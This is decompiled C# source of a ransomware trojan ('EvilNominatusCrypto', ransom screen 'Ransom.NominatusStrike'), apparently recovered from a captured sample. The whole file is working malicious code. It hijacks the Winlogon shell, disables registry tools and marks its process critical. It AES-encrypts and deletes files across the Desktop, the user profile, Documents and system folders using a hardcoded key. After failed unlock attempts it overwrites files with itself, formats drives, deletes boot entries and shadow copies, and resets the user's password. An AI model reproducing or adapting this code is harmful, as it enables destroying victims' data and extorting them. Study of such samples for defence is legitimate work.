// Decompiled with JetBrains decompiler
// Type: TRS.MainForm
// Assembly: EvilNominatusCrypto, Version=1.0.8055.4704, Culture=neutral, PublicKeyToken=null
// MVID: 23E263BE-B1CF-418E-84F2-AE1C71D2153B
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\Trojan.MSIL.Agent.qwilkc-01cec0306b25849804ac2770d877423d9f00adfae6217c72842630d18c048ba4.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TRS
{
  public class MainForm : Form
  {
    public int live = 3;
    private IContainer components = (IContainer) null;
    private Button button1;
    private Label label3;
    private RichTextBox richTextBox1;
    private Label label2;
    private Label label1;

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

    public static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    public MainForm()
    {
      this.InitializeComponent();
      try
      {
        Process.EnterDebugMode();
        MainForm.RtlSetProcessIsCritical(1U, 0U, 0U);
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) Application.ExecutablePath, RegistryValueKind.String);
        MainForm.runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
        string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        Directory.GetFiles(folderPath1);
        Directory.GetDirectories(folderPath1);
        string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string[] files1 = Directory.GetFiles(folderPath1, "*.*", SearchOption.AllDirectories);
        string[] directories = Directory.GetDirectories(folderPath2);
        int index1 = 0;
        while (index1 < directories.Length)
        {
          try
          {
            this.MakeThemDIE(directories[index1]);
            this.EncryptIT(directories[index1]);
          }
          catch
          {
          }
          checked { ++index1; }
        }
        int index2 = 0;
        while (index2 < files1.Length)
        {
          try
          {
            this.EncryptIT(files1[index2]);
            File.Delete(files1[index2]);
          }
          catch
          {
          }
          checked { ++index2; }
        }
        try
        {
          string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
          string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.System);
          string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
          string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.Resources);
          string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories);
          string[] files3 = Directory.GetFiles(folderPath6, "*.*", SearchOption.AllDirectories);
          string[] files4 = Directory.GetFiles(folderPath5, "*.*", SearchOption.AllDirectories);
          string[] files5 = Directory.GetFiles(folderPath4, "*.*", SearchOption.AllDirectories);
          string[] files6 = Directory.GetFiles(folderPath3, "*.*", SearchOption.AllDirectories);
          int index3 = 0;
          while (index3 < files2.Length)
          {
            try
            {
              this.EncryptIT(files2[index3]);
              File.Delete(files2[index3]);
            }
            catch
            {
            }
            checked { ++index3; }
          }
          int index4 = 0;
          while (index4 < files3.Length)
          {
            try
            {
              this.EncryptIT(files3[index4]);
              File.Delete(files3[index4]);
            }
            catch
            {
            }
            checked { ++index4; }
          }
          int index5 = 0;
          while (index5 < files4.Length)
          {
            try
            {
              this.EncryptIT(files4[index5]);
              File.Delete(files4[index5]);
            }
            catch
            {
            }
            checked { ++index5; }
          }
          int index6 = 0;
          while (index6 < files5.Length)
          {
            try
            {
              this.EncryptIT(files5[index6]);
              File.Delete(files5[index6]);
            }
            catch
            {
            }
            checked { ++index6; }
          }
          int index7 = 0;
          while (index7 < files6.Length)
          {
            try
            {
              this.EncryptIT(files5[index7]);
              File.Delete(files5[index7]);
            }
            catch
            {
            }
            checked { ++index7; }
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void Label1Click(object sender, EventArgs e)
    {
    }

    private void Button1Click(object sender, EventArgs e)
    {
      if (this.richTextBox1.Text == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
      {
        MainForm.RtlSetProcessIsCritical(0U, 0U, 0U);
        MainForm.runCommand("assoc .exe=exefile");
        MainForm.runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "explorer.exe", RegistryValueKind.String);
        MainForm.runCommand("explorer.exe");
        foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories))
        {
          try
          {
            this.MakeThemAlive(file);
          }
          catch
          {
          }
        }
        this.Close();
      }
      else
      {
        if (!(this.richTextBox1.Text == this.richTextBox1.Text))
          return;
        if (this.live == 0)
        {
          string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories);
          int index = 0;
          while (index < files.Length)
          {
            this.Attack1(files[index]);
            File.Delete(files[index]);
            checked { ++index; }
          }
          MainForm.runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
          foreach (object drive in DriveInfo.GetDrives())
            this.Damage(drive.ToString());
          int num = (int) MessageBox.Show("have fun with dying! cya in hell");
          Thread.Sleep(7);
          MainForm.runCommand("net users %username% 912983");
          MainForm.runCommand("bcdedit /delete {current}");
          MainForm.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
          MainForm.runCommand("taskkill /im wininit.exe /f");
        }
        else
        {
          checked { --this.live; }
          int num = (int) MessageBox.Show("Wrong! you have " + this.live.ToString() + " chance!");
        }
      }
    }

    public void MakeThemDIE(string Path1)
    {
      try
      {
        string userName = Environment.UserName;
        Directory.GetAccessControl(Path1);
        FileSystemAccessRule systemAccessRule = new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny);
      }
      catch
      {
      }
    }

    public void Attack1(string FName)
    {
      byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
      File.WriteAllBytes(FName, bytes);
    }

    public void Damage(string DriveNameToFormat) => MainForm.runCommand("format " + DriveNameToFormat + " /FS:NTFS /X /Q /y");

    public void MakeThemAlive(string PathN)
    {
      string userName = Environment.UserName;
      Directory.GetAccessControl(PathN);
      FileSystemAccessRule systemAccessRule = new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Allow);
    }

    public void EncryptIT(string inputFile)
    {
      try
      {
        byte[] bytes = new UnicodeEncoding().GetBytes("7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK");
        using (FileStream fileStream1 = new FileStream(inputFile + "-Locked", FileMode.Create))
        {
          using (AesManaged aesManaged = new AesManaged())
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write))
            {
              using (FileStream fileStream2 = new FileStream(inputFile, FileMode.Open))
              {
                aesManaged.KeySize = 256;
                aesManaged.BlockSize = 128;
                int num;
                while ((num = fileStream2.ReadByte()) != -1)
                  cryptoStream.WriteByte(checked ((byte) num));
              }
            }
          }
        }
        File.Delete(inputFile + ".*");
      }
      catch
      {
      }
    }

    public void GetSystemFolder() => Environment.GetFolderPath(Environment.SpecialFolder.Windows);

    public void GetSystem32() => Environment.GetFolderPath(Environment.SpecialFolder.Windows);

    public void InfectTheFile(string FileNAME1)
    {
      try
      {
        byte[] bytes = File.ReadAllBytes(Application.ExecutablePath);
        File.WriteAllBytes(FileNAME1, bytes);
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (MainForm));
      this.label1 = new Label();
      this.label2 = new Label();
      this.richTextBox1 = new RichTextBox();
      this.label3 = new Label();
      this.button1 = new Button();
      this.SuspendLayout();
      this.label1.BackColor = System.Drawing.Color.Transparent;
      this.label1.FlatStyle = FlatStyle.Flat;
      this.label1.Font = new Font("Microsoft Sans Serif", 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.DarkRed;
      this.label1.Location = new Point(12, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(698, 44);
      this.label1.TabIndex = 0;
      this.label1.Text = "CryptoVirus Detected!  Ransom.NominatusStrike";
      this.label1.Click += new EventHandler(this.Label1Click);
      this.label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.Location = new Point(12, 53);
      this.label2.Name = "label2";
      this.label2.Size = new Size(680, 172);
      this.label2.TabIndex = 1;
      this.label2.Text = componentResourceManager.GetString("label2.Text");
      this.richTextBox1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.richTextBox1.Location = new Point(60, 276);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(316, 18);
      this.richTextBox1.TabIndex = 2;
      this.richTextBox1.Text = "";
      this.label3.Font = new Font("Microsoft Sans Serif", 9.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(12, 276);
      this.label3.Name = "label3";
      this.label3.Size = new Size(58, 24);
      this.label3.TabIndex = 3;
      this.label3.Text = "Code:";
      this.button1.FlatStyle = FlatStyle.System;
      this.button1.Location = new Point(382, 274);
      this.button1.Name = "button1";
      this.button1.Size = new Size(141, 23);
      this.button1.TabIndex = 4;
      this.button1.Text = "GO AWAY!!";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.AppWorkspace;
      this.ClientSize = new Size(722, 357);
      this.ControlBox = false;
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (MainForm);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "TRS";
      this.ResumeLayout(false);
    }
  }
}
